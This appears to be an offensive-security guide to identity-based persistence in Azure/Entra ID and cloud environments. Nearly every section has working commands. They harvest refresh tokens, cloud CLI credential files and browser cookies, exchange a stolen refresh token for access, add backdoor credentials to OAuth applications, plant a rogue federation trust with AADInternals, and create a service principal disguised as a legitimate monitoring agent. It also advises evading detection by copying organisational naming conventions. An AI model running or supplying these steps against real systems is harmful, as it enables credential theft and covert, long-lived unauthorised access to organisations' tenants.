# Identity-based persistence

Identity-based persistence requires no malware, no process, and no file on disk.
It survives reboots, patching, and even many incident response procedures because
the persisting mechanism is a valid credential or trust relationship, not an artefact.

## Why it works

Modern environments authenticate everything through identity providers. If an attacker
controls a valid identity (a token, an application registration, a trust relationship)
they can re-enter the environment from anywhere, at any time, using the same paths
legitimate users do.

Detection requires noticing that a valid authentication is anomalous, which is a far
harder problem than noticing that a malicious file exists.

## Refresh token theft and abuse

OAuth refresh tokens are long-lived credentials that can be exchanged for new access
tokens without user interaction or MFA. Stealing one provides persistent access for
as long as the token remains valid (days to months depending on the provider's policy).

Where to find refresh tokens on Windows:

```powershell
# browser credential stores (Chrome, Edge): encrypted with DPAPI
# location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
# and: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies

# Office/Teams tokens in MSAL cache
# location: %LOCALAPPDATA%\.IdentityService\msal.cache

# Windows Credential Manager
cmdkey /list
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll()
```

On Linux:

```text
# browser credential stores (Chrome/Chromium): encrypted with libsecret or kwallet
# ~/.config/google-chrome/Default/Cookies (SQLite)
# ~/.config/microsoft-edge/Default/Cookies

# access token files for cloud CLIs
cat ~/.aws/credentials
cat ~/.azure/accessTokens.json
cat ~/.config/gcloud/access_tokens.db
```

Once obtained, a refresh token can be used from any system:

```python
import requests

# exchange refresh token for access token (Azure AD / Entra ID example)
response = requests.post(
    'https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token',
    data={
        'client_id': 'CLIENT_ID',
        'grant_type': 'refresh_token',
        'refresh_token': 'STOLEN_REFRESH_TOKEN',
        'scope': 'https://graph.microsoft.com/.default'
    }
)
access_token = response.json()['access_token']
```

## OAuth application backdoor

Creating a new OAuth application (or adding credentials to an existing one) in the
target's identity provider gives persistent access that is independent of any user
account and is not disabled when the compromised user's password is changed.

Azure AD / Entra ID:

```powershell
# add credentials to an existing OAuth app (requires Application.ReadWrite permission)
# this is persistence that outlasts the compromised user session
$app = Get-AzureADApplication -Filter "DisplayName eq 'Target App'"
New-AzureADApplicationPasswordCredential -ObjectId $app.ObjectId `
  -CustomKeyIdentifier "backup" `
  -EndDate (Get-Date).AddYears(2)
```

Creating a new application registration with permissions to the resources of interest
is even less likely to be noticed: it looks like a developer adding a new integration.

## Federation trust and SSO backdoors

In federated environments (ADFS, Azure AD External Identities), trust relationships
allow one identity provider to authenticate on behalf of another. Adding a rogue
federation trust allows an attacker to generate valid authentication tokens for any
user in the target tenant.

The AADInternals technique for Azure AD:

```powershell
# add a backdoor federation trust (requires Global Administrator)
# this allows generating tokens for any user without their password or MFA
Import-Module AADInternals
$cert = New-AADIntBackdoor -AccessToken $adminToken
# the cert can now sign tokens that Azure AD trusts for any user in the tenant
```

This persists independently of all user passwords. The federation trust remains until
explicitly removed.

## Service principal and managed identity abuse

Service principals are non-human identities with permissions to Azure, AWS, or GCP
resources. Creating a new service principal with high permissions, or adding credentials
to an existing one, provides machine-to-machine persistent access.

```powershell
# create a new service principal with contributor role (Azure)
$sp = New-AzADServicePrincipal -DisplayName "AzureMonitorAgent" -Role Contributor
$cred = New-AzADSpCredential -ObjectId $sp.Id
# store the AppId and secret: this is the persistent access mechanism
```

The service principal name should match the naming conventions used by the organisation
for legitimate infrastructure service principals.

## Session cookie theft

Long-lived session cookies for web applications (SaaS, internal apps, cloud consoles)
provide persistent access that may survive password resets if the session is not
explicitly invalidated.

```text
# extract cookies from browser storage for target domains
# using a post-exploitation tool or directly from the cookie store:
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies (SQLite)

sqlite3 Cookies "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.microsoft.com'"
# decrypt encrypted_value using CryptUnprotectData (DPAPI)
```

Stolen session cookies can be imported into a browser using extensions or directly
into a Burp/mitmproxy session to authenticate as the victim user.
